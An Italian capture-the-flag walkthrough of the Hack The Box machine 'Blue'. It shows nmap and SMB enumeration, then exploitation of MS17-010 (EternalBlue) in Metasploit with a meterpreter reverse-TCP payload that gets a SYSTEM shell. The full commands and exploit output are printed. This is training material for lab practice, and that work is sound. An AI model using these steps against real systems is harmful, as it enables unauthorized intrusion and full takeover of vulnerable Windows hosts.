---
title: "Blue Walkthrough"
description: "Blue, sebbene sia probabilmente la macchina più easy su Hack The Box, dimostra la gravità dell'exploit EternalBlue, utilizzato in molteplici attacchi su larga scala di ransomware e crypto-mining dopo la sua divulgazione pubblica."
author: dua2z3rr
date: 2025-08-09 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Protocols", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Area di Interesse: Enterprise Network", "Area di Interesse: Vulnerability Assessment", "Vulnerabilità: Remote Code Execution"]
image: /assets/img/blue/blue-resized.png"
---

## Enumerazione Esterna

### Nmap

Cominciamo con Nmap:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~/Boxes/blue]
└──╼ $nmap 10.10.10.40 -sC -sV -vv -p-
<SNIP>
PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 51938/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 55656/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-10T00:09:31+01:00
|_clock-skew: mean: -19m56s, deviation: 34m36s, median: 1s
| smb2-time: 
|   date: 2025-08-09T23:09:29
|_ 
```

Già da questo output possiamo capire molte cose importanti, come il sistema operativo e l'hostname.

### SMB

Cominciamo dall'enumerare gli shares di smb con CrackMapExec.

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/blue]
└──╼ $crackmapexec smb 10.10.10.40 --shares -u 'guest' -p ''
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\guest: 
SMB         10.10.10.40     445    HARIS-PC         [+] Enumerated shares
SMB         10.10.10.40     445    HARIS-PC         Share           Permissions     Remark
SMB         10.10.10.40     445    HARIS-PC         -----           -----------     ------
SMB         10.10.10.40     445    HARIS-PC         ADMIN$                          Remote Admin
SMB         10.10.10.40     445    HARIS-PC         C$                              Default share
SMB         10.10.10.40     445    HARIS-PC         IPC$                            Remote IPC
SMB         10.10.10.40     445    HARIS-PC         Share           READ            
SMB         10.10.10.40     445    HARIS-PC         Users           READ 
```

> Gli shares che terminano con `$` sono quelli amministrativi.
{: .prompt-info }

Con le informazioni ottenute, se facciamo una ricerca online potremmo trovare un microsoft security BulletIn, **MS17-010**. Potremmo utilizzare questa vulnerbilità a nostro favore.

## Exploitation

Utilizziamo Metasploit per utilizzare EternalBlue

```shell
┌─[dua2z3rr@parrot]─[~/Boxes/blue]
└──╼ $msfconsole
Metasploit tip: Use the 'capture' plugin to start multiple 
authentication-capturing and poisoning services
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.4.71-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
+ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

<SNIP>

[msf](Jobs:0 Agents:0) >> use eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

<SNIP>

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mac
                                             hines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machine
                                             s.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.230.43.82     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOST 10.10.10.40
RHOST => 10.10.10.40
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST 10.10.14.10
LHOST => 10.10.14.10
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set payload 31
payload => windows/x64/shell/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> set payload 31
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> run
[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.40:49160) at 2025-08-10 02:31:26 +0200

(Meterpreter 2)(C:\Windows\system32) >
```

> Potrebbero essere necessari più tentativi. Assicurarsi di avere l'ultima versione disponibile di msf-console.
{: .prompt:warning }

```shell
(Meterpreter 2)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Siamo l'utente con i massimi privilegi, quindi non ci rimane altro che prendere le flag e terminare la box.
